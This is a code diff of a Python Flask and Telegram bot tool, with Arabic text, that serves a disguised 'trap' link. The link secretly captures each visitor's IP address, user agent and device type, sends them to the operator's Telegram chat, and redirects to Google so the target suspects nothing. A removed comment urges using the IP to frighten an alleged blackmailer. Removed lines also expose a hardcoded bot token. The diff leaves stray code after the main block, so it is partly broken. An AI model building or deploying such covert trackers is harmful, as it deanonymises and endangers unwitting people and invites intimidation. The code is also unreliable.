@@ -4,36 +4,51 @@ import threading
 import os
 
 # --- إعدادات النظام ---
-TOKEN = '8126709241:AAFxizwyusZ6xDEWzC15s3Y0lyqpC3vUDoI'
-ADMIN_ID = "6102641066"  # هويتك الرقمية التي تظهر في التقارير
+TOKEN = os.getenv('BOT_TOKEN')
+ADMIN_ID = "6102641066"
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# --- 1. نظام سحب البيانات (Tracker) ---
+@app.route('/')
+def home():
+    return redirect("https://www.google.com")
+
 @app.route('/check')
 def tracker():
-    # سحب الـ IP الحقيقي حتى لو كان خلف بروكسي
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # تحديد نوع الجهاز ببساطة
     device = "غير معروف"
     if "Android" in user_agent: device = "Android 📱"
-    elif "iPhone" in user_agent: device = "iPhone 🍏"
-    elif "Windows" in user_agent: device = "Windows PC 💻"
-
-    # إرسال التقرير فوراً للمتمرد اليماني
-    report = "⚠️ **تم رصد دخول للمستهدف!**\n\n"
-    report += f"🌐 **عنوان الـ IP:** `{ip}`\n"
-    report += f"📱 **نوع الجهاز:** {device}\n"
-    report += f"🛠️ **المتصفح:** `{user_agent[:50]}...`\n\n"
-    report += "💡 *نصيحة:* استخدم الـ IP الآن لإرعاب المبتز."
+    elif "iPhone" in user_agent: device = "iPhone 🍎"
+    elif "Windows" in user_agent: device = "Windows 💻"
     
-    try:
-        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
-    except Exception as e:
-        print(f"Error sending message: {e}")
-        
+    report = f"⚠️ **تم رصد دخول للمستهدف**\n\n"
+    report += f"🌐 **IP:** `{ip}`\n"
+    report += f"📱 **الجهاز:** {device}\n"
+    report += f"🔍 **المتصفح:** {user_agent}"
+    
+    bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
+    return redirect("https://www.google.com")
+
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    msg = "🛡️ **أهلاً بك في نظام الردع التقني**\n\n"
+    msg += "استخدم /link للحصول على رابط الفخ."
+    bot.reply_to(message, msg, parse_mode="Markdown")
+
+@bot.message_handler(commands=['link'])
+def send_link(message):
+    domain = "inspiring-comfort-production.up.railway.app"
+    msg = f"✅ **الرابط الجاهز:**\n`https://{domain}/check`"
+    bot.reply_to(message, msg, parse_mode="Markdown")
+
+def run_bot():
+    bot.polling(none_stop=True)
+
+if __name__ == "__main__":
+    threading.Thread(target=run_bot).start()
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
     # توجيه المبتز لموقع وهمي (جوجل) لعدم الشك
     return redirect("https://www.google.com")
 
